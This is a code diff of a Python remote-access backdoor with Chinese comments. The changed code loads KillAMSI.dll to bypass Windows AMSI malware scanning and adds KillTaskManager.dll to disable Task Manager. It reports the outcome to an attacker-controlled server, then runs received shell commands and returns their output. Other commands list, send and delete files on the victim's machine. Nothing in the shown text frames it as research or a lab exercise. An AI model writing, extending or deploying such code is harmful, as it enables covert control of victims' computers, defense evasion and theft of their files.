@@ -92,23 +92,37 @@ while True:
     try:
         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         client.connect((IP, PORT))
-        #废掉AMSI（使用脚本所在目录的绝对路径，避免提权后工作目录变化导致加载失败）
-        amsi_msg = None
+        #禁用 AMSI 和任务管理器（使用脚本所在目录的绝对路径，避免提权后工作目录变化导致加载失败）
         try:
-            script_dir = os.path.dirname(os.path.abspath(sys.argv[0] if getattr(sys, 'frozen', False) else __file__))
-            dll_path = os.path.join(script_dir, 'KillAMSI.dll')
-            killamsi = ctypes.CDLL(dll_path)
+            script_dir = os.path.dirname(os.path.abspath(
+                sys.argv[0] if getattr(sys, 'frozen', False) else __file__))
+            #加载 KillAMSI.dll 并调用 KillAmsi() 绕过 AMSI 检测
+            dll_path_KillAMSI = os.path.join(script_dir, 'KillAMSI.dll')
+            killamsi = ctypes.CDLL(dll_path_KillAMSI)
+            #加载 KillTaskManager.dll 并调用 KillTaskManager() 禁用任务管理器
+            dll_path_KillTaskManager = os.path.join(script_dir, 'KillTaskManager.dll')
+            killtaskmanager = ctypes.CDLL(dll_path_KillTaskManager)
+
             killamsi.KillAmsi.restype = ctypes.c_int
+            killtaskmanager.KillTaskManager.restype = ctypes.c_int
             amsi_ret = killamsi.KillAmsi()
             if amsi_ret == 0:
-                client.sendall(amsi_msg)
-                ack = client.recv(1024)
+                amsi_msg = "AMSI以禁用"
+            else:
+                amsi_msg = "AMSI禁用失败"
+            taskmanager_ret = killtaskmanager.KillTaskManager()
+            if taskmanager_ret == 0:
+                taskmanager_msg = "任务管理器已禁用"
+            else:
+                taskmanager_msg = "任务管理器禁用失败"
+            result_msg = f"{amsi_msg} | {taskmanager_msg}"
+            client.sendall(result_msg.encode('utf-8'))
+            ack = client.recv(1024)
         except Exception as e:
             try:
                 client.recv(1024)
             except Exception:
                 pass
-
 
         while True:
             # 只读1字节，防止与后续指令粘包
@@ -130,7 +144,7 @@ while True:
                     else:
                         res = subprocess.run(cmd, shell=True, capture_output=True, text=True, encoding='gbk')
                         output = (res.stdout + res.stderr) or '(无输出)'
-                                
+
                     out_bytes = output.encode('gbk', errors='ignore')
                     client.sendall(f"{len(out_bytes):08d}".encode() + out_bytes)
 
@@ -195,6 +209,7 @@ while True:
                     sinter_list=recv_sinter.split(maxsplit=1)
                     if not sinter_list:
                         continue
+
                     if sinter_list[0]=='look':
                         try:
                             files=os.listdir(sinter_list[1])
@@ -217,6 +232,7 @@ while True:
                                     client.sendall(chunk)
                         except Exception as e:
                             client.sendall(b"-0000001")  # 发送-1表示失败，区别于空文件
+
                     elif sinter_list[0]=='delete':
                         try:
                             os.remove(sinter_list[1])
